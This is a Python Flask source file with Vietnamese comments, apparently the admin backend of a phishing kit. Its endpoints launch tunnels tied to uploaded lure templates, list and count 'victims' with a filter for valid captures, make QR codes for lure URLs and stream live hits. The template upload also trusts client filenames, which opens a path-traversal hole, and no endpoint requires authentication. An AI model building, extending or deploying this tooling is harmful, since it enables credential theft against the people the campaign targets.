import os
import queue
import json
from flask import Blueprint, request, jsonify, Response, send_from_directory
from core.tunnel_service import TunnelService
from core.victim_service import VictimService
from core.template_service import TemplateService
from core.webhook_service import WebhookService
from core.config_service import ConfigService
from utils.sse_manager import SSEManager
from utils.qr_code import generate_qr_base64

# Xác định đường dẫn tuyệt đối đến thư mục frontend
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_DIR = os.path.join(BASE_DIR, '..', '..', 'frontend')

admin_bp = Blueprint('admin', __name__,
                     static_folder=FRONTEND_DIR,
                     static_url_path='/static')

# ============================================================
# API (giữ nguyên các endpoint, đảm bảo import đúng service)
# ============================================================
@admin_bp.route('/api/tunnels', methods=['GET'])
def get_tunnels():
    status = request.args.get('status')
    tunnel_svc = admin_bp.app.config['tunnel_service']
    tunnels = tunnel_svc.get_all(status)
    return jsonify({"success": True, "data": tunnels})

@admin_bp.route('/api/tunnels', methods=['POST'])
def create_tunnels():
    data = request.get_json() or {}
    count = int(data.get('quantity', 1))
    auto_stop = int(data.get('auto_stop_minutes', 0))
    template_id = data.get('template_id')
    tunnel_svc = admin_bp.app.config['tunnel_service']
    try:
        tunnels = tunnel_svc.create(count, auto_stop, template_id)
        return jsonify({"success": True, "data": [t.__dict__ for t in tunnels]})
    except ValueError as e:
        return jsonify({"success": False, "error": str(e)}), 400

@admin_bp.route('/api/tunnels/<int:tid>', methods=['DELETE'])
def stop_tunnel(tid):
    tunnel_svc = admin_bp.app.config['tunnel_service']
    ok = tunnel_svc.stop(tid)
    return jsonify({"success": ok})

@admin_bp.route('/api/tunnels', methods=['DELETE'])
def stop_all_tunnels():
    tunnel_svc = admin_bp.app.config['tunnel_service']
    tunnel_svc.stop_all()
    return jsonify({"success": True})

@admin_bp.route('/api/tunnels/<int:tid>/restart', methods=['POST'])
def restart_tunnel(tid):
    tunnel_svc = admin_bp.app.config['tunnel_service']
    ok = tunnel_svc.restart(tid)
    return jsonify({"success": ok})

@admin_bp.route('/api/victims', methods=['GET'])
def get_victims():
    victim_svc = admin_bp.app.config['victim_service']
    limit = request.args.get('limit', 100, type=int)
    valid_only = request.args.get('valid_only', '0') == '1'
    victims = victim_svc.get_recent(limit, valid_only)
    return jsonify({"success": True, "data": victims})

@admin_bp.route('/api/victims/stats', methods=['GET'])
def victim_stats():
    victim_svc = admin_bp.app.config['victim_service']
    stats = victim_svc.get_stats()
    return jsonify({"success": True, "data": stats})

@admin_bp.route('/api/templates', methods=['GET'])
def list_templates():
    template_svc = admin_bp.app.config['template_service']
    templates = template_svc.get_active_templates()
    return jsonify({"success": True, "data": templates})

@admin_bp.route('/api/templates/upload', methods=['POST'])
def upload_template():
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "Thiếu file"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "error": "Tên file trống"}), 400
    from config import TEMPLATES_DIR
    import os as _os
    filepath = _os.path.join(TEMPLATES_DIR, file.filename)
    file.save(filepath)
    template_svc = admin_bp.app.config['template_service']
    template_svc.sync_files()
    return jsonify({"success": True})

@admin_bp.route('/api/templates/<int:template_id>/toggle', methods=['POST'])
def toggle_template(template_id):
    template_svc = admin_bp.app.config['template_service']
    ok = template_svc.toggle_active(template_id)
    return jsonify({"success": ok})

@admin_bp.route('/api/qr', methods=['POST'])
def generate_qr():
    data = request.get_json()
    url = data.get('url', '')
    b64 = generate_qr_base64(url)
    return jsonify({"success": True, "data": b64})

@admin_bp.route('/api/settings', methods=['GET'])
def get_settings():
    config_svc = admin_bp.app.config['config_service']
    settings = config_svc.get_all()
    return jsonify({"success": True, "data": settings})

@admin_bp.route('/api/settings', methods=['POST'])
def update_settings():
    data = request.get_json() or {}
    config_svc = admin_bp.app.config['config_service']
    for key, value in data.items():
        config_svc.set(key, str(value))
    return jsonify({"success": True})

# SSE endpoint
@admin_bp.route('/stream')
def stream():
    def event_stream():
        q = queue.Queue()
        SSEManager.register(q)
        try:
            while True:
                msg = q.get()
                yield f"data: {json.dumps(msg)}\n\n"
        except GeneratorExit:
            SSEManager.unregister(q)
    return Response(event_stream(), mimetype="text/event-stream")

# ============================================================
# Frontend – phục vụ giao diện chính
# ============================================================
@admin_bp.route('/')
def serve_index():
    return send_from_directory(FRONTEND_DIR, 'index.html')

@admin_bp.route('/<path:path>')
def serve_static(path):
    # Cho phép truy cập file tĩnh như css, js
    return send_from_directory(FRONTEND_DIR, path)
